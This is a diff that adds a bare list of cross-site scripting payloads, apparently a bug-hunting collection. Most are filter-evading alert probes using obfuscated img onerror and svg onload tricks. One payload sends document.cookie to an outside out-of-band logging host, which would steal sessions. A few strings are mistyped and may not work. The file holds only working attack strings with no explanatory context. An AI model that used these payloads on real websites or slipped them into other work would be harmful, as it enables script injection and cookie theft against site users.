@@ -1,0 +1,37 @@
+"><img%20src=x%20onerror=alert("XSS");>
+
+"><svg/onload=setTimeout`${ale%27+%27rt}`>
+
+`%3cimg%2fsrc%2fonerror%3dalert%2f%2f%26NewLine%3b(2)%3e`
+
+<img src=x onerror=alert(1)>
+
+1'//"</Script><img/Src%OAOnError=alert(1)//
+
+"top[8680439..toString(30)](document.domain)"or"top[8680439..toString(30)](new%20Image().src%3D%27https://XXX.oastfy.com/log?cooke%3D%27&2Bdocument.cookie)"
+
+<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\x287\x29;var\x20Uncaught//';z>
+
+<svg/onload=parent[/al/.source+/ert/.source](1)>
+
+<svg/onload=parent[/al/.source.concat(/ert/.source)](2)>
+
+<svg/onload=alert(1)>
+
+<math><set onbegin=confirm(1)>
+
+<iframe srcdoc="&it;svg onload=alert(1)&gt;">
+
+';k='e'%0Atop['al'+k+'rt'](1)//
+
+<img/src/onerror="(function(x){this[x+`ert`](1)})`al`">
+
+<img/src/onerror="window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)">
+
+<img/src/onerror="document['defult'+'view'][`al`+/e/[`ex`+`ec`]`e`+`rt`(3)>
+
+<img/src/onerror="this.ownerDocument.defultView['\u0061lert'](4)">
+
+<h1><img/src=x onerror=alert(1)></h1>
+
+<Img Src=OnXSS OnError=(alert)(1)>
